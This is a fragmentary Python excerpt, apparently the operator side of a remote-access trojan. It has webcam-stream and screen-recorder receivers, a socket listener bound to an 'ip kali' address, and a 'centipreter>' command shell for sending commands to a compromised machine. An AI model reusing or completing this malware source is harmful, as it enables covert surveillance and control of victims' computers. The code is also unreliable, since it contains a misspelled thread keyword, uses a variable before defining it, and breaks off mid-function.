...
def stream_cam():
    t = threading.Thread(trget = konversi_byte_stream)
    t.start()

def konversi_byte_screen_recorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(('ip kali', 9997))
    sock.listen(5)
    koneksi = sock.accept()
    tg = koneksi[0]
    ip = koneksi[1]
...
def komunikasi_shell():
    n = 0
    while True:
        perintah = input('centipreter>')
        data = data.dumps(perintah)
